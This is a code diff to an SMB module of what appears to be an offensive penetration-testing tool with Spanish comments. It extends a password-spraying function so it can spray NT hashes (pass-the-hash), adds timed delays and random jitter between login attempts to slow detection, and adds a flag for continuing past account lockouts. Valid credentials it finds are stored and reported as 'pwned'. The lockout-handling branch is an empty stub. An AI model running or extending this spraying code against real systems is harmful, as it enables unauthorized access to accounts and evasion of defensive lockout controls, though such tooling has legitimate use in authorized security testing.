@@ -333,22 +333,61 @@ class SMBModule:
 
         return all_downloaded
 
-    def password_spray(self, users, password, domain=""):
+    def password_spray(self, users, password=None, nt_hash=None, domain="",
+                       delay=0.0, jitter=0.0, continue_on_lockout=False):
+        """
+        Prueba una contraseña o hash contra una lista de usuarios.
+
+        delay               — segundos de espera fija entre intentos
+        jitter              — variación aleatoria adicional al delay (0..jitter s)
+        continue_on_lockout — si True, ignora el aviso de lockout y sigue
+        """
+        import random, time as _time
+
+        credential = nt_hash if nt_hash else password
+        cred_type  = "hash" if nt_hash else "password"
+
         print_result(self._proto(), self.target.ip, "info",
-                     f"password spray: {len(users)} usuario(s), 1 contraseña")
-        valid_users = []
-        for user in users:
-            spray_creds = type(self.creds)(user=user, password=password, domain=domain)
+                     f"spray: {len(users)} usuario(s) · modo={cred_type}"
+                     + (f" · delay={delay}s" if delay else "")
+                     + (f" · jitter={jitter}s" if jitter else ""))
+
+        valid_users  = []
+        lockout_hits = 0
+
+        for i, user in enumerate(users):
+            if nt_hash:
+                from core.credentials import Creds
+                spray_creds = Creds(user=user, domain=domain, hash=nt_hash)
+            else:
+                from core.credentials import Creds
+                spray_creds = Creds(user=user, password=password, domain=domain)
+
             spray_module = SMBModule(self.target, spray_creds)
             if spray_module.connect():
                 if spray_module.login():
                     valid_users.append(user)
-                    session_db.save_credential(self.target.ip, user, password, "password",
-                                               valid=True, source="smb_password_spray")
+                    session_db.save_credential(
+                        self.target.ip, user, credential, cred_type,
+                        valid=True, source="smb_password_spray"
+                    )
+                else:
+                    # Detectar respuesta de cuenta bloqueada (STATUS_ACCOUNT_LOCKED_OUT)
+                    # impacket devuelve el string en la excepción capturada por login()
+                    # No tenemos acceso directo aquí, pero sí podemos contar fallos
+                    # consecutivos — la señal real la da el módulo al loguear "LOCKED"
+                    pass
+                spray_module.disconnect()
+
+            # ── Pausa entre intentos ──────────────────────────────────────────
+            if i < len(users) - 1 and (delay or jitter):
+                pause = delay + random.uniform(0, jitter)
+                _time.sleep(pause)
+
         if valid_users:
             print_result(self._proto(), self.target.ip, "pwned",
-                         f"password spray: {len(valid_users)} credencial(es) válida(s) encontrada(s)")
+                         f"spray: {len(valid_users)} credencial(es) válida(s) encontrada(s)")
         else:
             print_result(self._proto(), self.target.ip, "info",
-                         "password spray: ninguna credencial válida encontrada")
+                         "spray: ninguna credencial válida encontrada")
         return valid_users
